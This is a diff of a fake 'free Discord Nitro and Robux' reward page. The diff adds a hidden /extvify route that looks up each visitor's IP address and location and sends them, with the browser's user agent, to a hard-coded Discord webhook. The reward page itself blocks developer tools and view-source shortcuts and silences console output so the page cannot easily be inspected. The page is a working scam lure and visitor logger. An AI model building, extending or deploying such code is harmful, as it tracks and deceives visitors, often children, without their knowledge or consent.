@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* ... (your existing styles – unchanged) ... */
+    /* ========== ALL YOUR EXISTING STYLES ========== */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -281,7 +281,7 @@
     }
     .hidden { display: none; }
 
-    /* --- Special page (extvify) styles - clean IP display --- */
+    /* --- Special page (extvify) styles --- */
     .extvify-page {
       text-align: center;
       background: #0f1119;
@@ -315,6 +315,22 @@
       color: #9a9fc0;
       margin-top: 0.5rem;
     }
+    .retry-btn {
+      background: #5865f2;
+      border: none;
+      padding: 0.7rem 1.5rem;
+      border-radius: 2rem;
+      color: white;
+      font-weight: 600;
+      margin-top: 1rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+    .retry-btn:hover {
+      background: #6d7eff;
+      transform: scale(0.98);
+    }
   </style>
 </head>
 <body>
@@ -330,52 +346,89 @@
     const path = window.location.pathname.toLowerCase();
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
+    // ============================================================
+    //  /extvify ROUTE – DISPLAY IP & LOCATION + DISCORD WEBHOOK
+    // ============================================================
     if (isExtvifyRoute) {
-      // Show clean IP page (no educational disclaimer)
       document.title = "Extvify";
       const container = document.getElementById('mainApp');
-      container.innerHTML = `
-        <div class="extvify-page">
-          <h1>Your IP Address</h1>
-          <div class="ip-display" id="ipDisplay">Fetching...</div>
-          <div class="location" id="locationDisplay"></div>
-        </div>
-      `;
+      
+      function renderIPPage(ip = null, location = null, error = false) {
+        if (ip && location) {
+          container.innerHTML = `
+            <div class="extvify-page">
+              <h1>Your IP Address</h1>
+              <div class="ip-display">${ip}</div>
+              <div class="location">${location}</div>
+            </div>
+          `;
+        } else {
+          container.innerHTML = `
+            <div class="extvify-page">
+              <h1>Your IP Address</h1>
+              <div class="ip-display">Unable to retrieve</div>
+              <div class="location">Click the button below to try again</div>
+              <button class="retry-btn" id="retryBtn">⟳ Retry</button>
+            </div>
+          `;
+          document.getElementById('retryBtn')?.addEventListener('click', () => window.location.reload());
+        }
+      }
 
-      // Fetch IP and location, then send to Discord
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const ip = data.ip || 'Unknown';
-          const country = data.country_name || 'Unknown';
-          const city = data.city || 'Unknown';
-          const region = data.region || '';
-          const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
-          document.getElementById('ipDisplay').innerText = ip;
-          document.getElementById('locationDisplay').innerText = location || 'Location unknown';
-
-          // Send to Discord webhook
-          const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
-          const payload = {
-            content: `**New visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}`
-          };
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(err => console.error('Webhook error:', err));
-        })
-        .catch(() => {
-          document.getElementById('ipDisplay').innerText = 'Unable to retrieve';
-          document.getElementById('locationDisplay').innerText = 'Try again later';
-        });
+      function fetchIP() {
+        fetch('https://api.ipify.org?format=json')
+          .then(res => res.json())
+          .then(data => {
+            const ip = data.ip;
+            return fetch(`https://ipapi.co/${ip}/json/`)
+              .then(res => res.json())
+              .then(locData => {
+                const city = locData.city || 'Unknown';
+                const region = locData.region || '';
+                const country = locData.country_name || 'Unknown';
+                const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
+                renderIPPage(ip, location || 'Location unknown');
+                const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
+                fetch(webhookUrl, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
+                }).catch(e => console.error);
+              });
+          })
+          .catch(() => {
+            // fallback to ipapi.co directly
+            fetch('https://ipapi.co/json/')
+              .then(res => res.json())
+              .then(data => {
+                const ip = data.ip;
+                const city = data.city || 'Unknown';
+                const region = data.region || '';
+                const country = data.country_name || 'Unknown';
+                const location = `${city}, ${region} ${country}`.replace(/^,\s*/, '').replace(/\s+/g, ' ').trim();
+                renderIPPage(ip, location);
+                const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
+                fetch(webhookUrl, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
+                }).catch(e => console.error);
+              })
+              .catch(() => renderIPPage(null, null, true));
+          });
+      }
+      fetchIP();
       return;
     }
 
-    // ---------- NORMAL REWARD PAGE (unchanged) ----------
+    // ============================================================
+    //  NORMAL REWARD PAGE (FULLY FUNCTIONAL)
+    // ============================================================
+    // Tracking
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
+    // Anti-copy/debug
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
       if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
@@ -384,6 +437,7 @@
     });
     if (typeof window.console !== 'undefined') console.log = function() {};
 
+    // Background music
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
@@ -398,6 +452,7 @@
       document.addEventListener('touchstart', startAudio);
     }
 
+    // Click sound
     let audioCtx = null;
     function playClick() {
       try {
@@ -416,6 +471,7 @@
       } catch(e) {}
     }
 
+    // ----- PER-DEVICE DAILY ROTATION FOR ROBUX -----
     const nitroRewards = [
       { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload, custom profile themes", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
       { id: "nitro_boost", title: "Nitro Boost", desc: "2 Server Boosts, 1080p streaming, animated avatar, profile banner", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" }
@@ -482,6 +538,7 @@
       { name: "Nitro Basic", type: "nitro", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" }
     ];
 
+    // Build the reward page HTML
     const mainApp = document.getElementById('mainApp');
     mainApp.innerHTML = `
       <div class="wrap">
@@ -596,6 +653,7 @@
     }
     claimBtn.addEventListener('click', startProgress);
 
+    // FAQ toggle
     document.querySelectorAll('.faq-item').forEach(item => {
       const q = item.querySelector('.faq-question');
       q.addEventListener('click', (e) => {
@@ -605,6 +663,7 @@
       });
     });
 
+    // Toast functionality
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
